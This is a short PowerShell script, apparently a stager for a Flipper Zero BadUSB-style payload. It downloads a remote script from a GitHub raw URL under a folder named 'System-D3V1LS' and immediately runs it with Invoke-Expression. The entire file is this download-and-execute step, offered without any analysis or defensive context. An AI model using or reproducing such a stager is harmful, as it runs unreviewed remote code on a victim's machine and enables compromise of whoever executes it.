$scriptUrl = 'https://raw.githubusercontent.com/BeansBeam/Flipper-Files/main/Own%20Python%20Exe/System-D3V1LS/Powershell-Code/source.ps1'
$scriptContent = Invoke-RestMethod -Uri $scriptUrl
Invoke-Expression $scriptContent